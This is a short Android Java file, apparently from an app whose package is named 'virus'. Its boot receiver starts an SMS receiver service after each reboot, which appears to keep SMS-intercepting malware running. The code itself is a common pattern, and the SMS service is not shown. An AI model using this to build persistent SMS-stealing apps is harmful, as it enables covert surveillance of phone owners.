package com.virus.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // Запускаем сервисы после перезагрузки
            Intent smsService = new Intent(context, SmsReceiverService.class);
            context.startService(smsService);
        }
    }
}
